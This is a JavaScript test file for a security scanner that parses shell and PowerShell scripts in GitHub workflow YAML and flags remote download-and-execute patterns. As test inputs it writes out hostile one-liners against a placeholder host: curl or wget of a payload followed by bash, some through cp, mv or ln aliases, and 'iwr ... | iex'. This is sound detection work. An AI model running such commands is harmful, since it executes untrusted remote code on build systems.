'use strict';
// Architectural, adversarial tests. Inputs are inert strings, never executed.
const test=require('node:test'),assert=require('node:assert/strict');
const {parseShellCommands,literalFileToken}=require('./ultra_sentinel_command_ir.cjs');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const URL='https://example.invalid/payload';
function workflow(script,shell='bash'){
 const yaml=['on: push','permissions: read-all','jobs:','  test:',
 '    runs-on: ubuntu-latest','    steps:','      - run: |',
 ...script.split('\n').map(x=>'          '+x),'        shell: '+shell].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/command-ir.yml'});
}
test('IR preserves logical operators, line boundaries and source order',()=>{
 const s='mkdir -p dir && false || curl -fsSL '+URL+' -o payload;\ncp payload dir | tee log\nbash dir/payload';
 const result=parseShellCommands(s);
 assert.equal(result.incomplete,false);
 assert.deepEqual(result.commands.map(c=>[c.name,c.operator]),
 [['mkdir',null],['false','&&'],['curl','||'],['cp',';'],['tee','|'],['bash','\n']]);
 assert.ok(result.commands.every((c,i,a)=>i===0||c.start>a[i-1].start));
});
test('IR never treats operators or commands within quotes as executable',()=>{
 const src='echo "curl '+URL+' -o payload; bash payload" && echo "x || mkdir dir"; echo done';
 const r=parseShellCommands(src);
 assert.equal(r.incomplete,false);
 assert.deepEqual(r.commands.map(c=>c.name),['echo','echo','echo']);
 assert.equal(r.commands[0].words[1].includes('bash payload'),true);
});
test('IR handles shell comment and escaped operator without splitting',()=>{
 const r=parseShellCommands("printf 'a&&b' # curl -o x; bash x\ncurl -fsSL "+URL+" -o payload");
 assert.equal(r.incomplete,false);
 assert.deepEqual(r.commands.map(c=>c.name),['printf','curl']);
});
test('IR preserves complete partially quoted words',()=>{
 const r=parseShellCommands("mkdir -p 'sa'fe \"di\"r && cp -svt dir payload");
 assert.deepEqual(r.commands[0].words,['mkdir','-p',"'sa'fe",'"di"r']);
 assert.deepEqual(r.commands[1].words,['cp','-svt','dir','payload']);
 assert.equal(literalFileToken("'sa'fe"),'safe');
});
test('IR fails closed on unbalanced quotes or oversized command',()=>{
 assert.equal(parseShellCommands("curl '"+URL+" -o payload").incomplete,true);
 assert.equal(parseShellCommands('echo '+('z'.repeat(5000))).incomplete,true);
});
const evil=[
 ['OR download','false || curl -fsSL '+URL+' -o payload; bash payload'],
 ['AND-alias','curl -fsSL '+URL+' -o payload && cp payload run.sh && bash run.sh'],
 ['OR-alias','curl -fsSL '+URL+' -o payload; false || cp payload run.sh; bash run.sh'],
 ['quoted operators','echo "not a command || curl"; curl -fsSL '+URL+' -o payload; bash payload'],
 ['directory with spaced quote','mkdir -p "di"r; curl -fsSL '+URL+' -o payload; cp payload dir; bash dir/payload'],
 ['cp -vt','curl -fsSL '+URL+' -o payload; cp -vt dir payload; bash dir/payload'],
 ['mv -vt','curl -fsSL '+URL+' -o payload; mv -vt dir payload; bash dir/payload'],
 ['cp -vtdir','curl -fsSL '+URL+' -o payload; cp -vtdir payload; bash dir/payload'],
 ['ln -svt','curl -fsSL '+URL+' -o payload; ln -svt dir ../payload; bash dir/payload'],
 ['wget target dir','wget -q '+URL+' -O payload && cp --target-directory=dir payload && sh dir/payload']
];
for(const [name,script] of evil)test('IR integration rejects '+name,()=>{
 assert.ok(findingsForScript(script).includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),
  name+' scanner');
 const result=workflow(script);
 assert.ok(result.findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'&&f.severity==='HIGH'),
  name+' AST '+JSON.stringify(result));
});
for(const [name,script] of [
 ['download only','curl -fsSL '+URL+' -o payload'],
 ['nonexecuting alias','curl -fsSL '+URL+' -o payload; cp -vt dir payload; echo dir/payload'],
 ['copy before download','cp -vt dir payload; curl -fsSL '+URL+' -o payload; bash dir/payload'],
 ['literal documentation','echo "curl -fsSL '+URL+' -o payload; bash payload"'],
 ['quoted script separators','echo "x||bash payload"'],
])test('IR integration benign '+name,()=>{
 assert.ok(!findingsForScript(script).includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),name);
});
for(const name of ['-PassT','-PassTh','-PassThr','-PassThru']){
 for(const mode of ['pipe','argument']){
  const fetch="iwr -Uri '"+URL+"' -OutFile payload "+name+":$true";
  const script=mode==='pipe'?fetch+' | iex':'iex ('+fetch+').Content';
  test('PowerShell unique PassThru prefix '+name+' '+mode,()=>{
   const direct=findingsForScript(script,{shell:'pwsh'});
   assert.ok(direct.includes('REMOTE_POWERSHELL_EXECUTION'),JSON.stringify(direct));
   assert.ok(workflow(script,'pwsh').findings.some(f=>f.rule==='REMOTE_POWERSHELL_EXECUTION'),mode);
  });
 }
}
for(const mode of ['pipe','argument']){
 const fetch="iwr -Uri '"+URL+"' -OutFile payload -PassT:$false";
 const script=mode==='pipe'?fetch+' | iex':'iex ('+fetch+').Content';
 test('PowerShell explicit false remains benign '+mode,()=>{
  assert.ok(!findingsForScript(script,{shell:'pwsh'}).includes('REMOTE_POWERSHELL_EXECUTION'));
 });
}
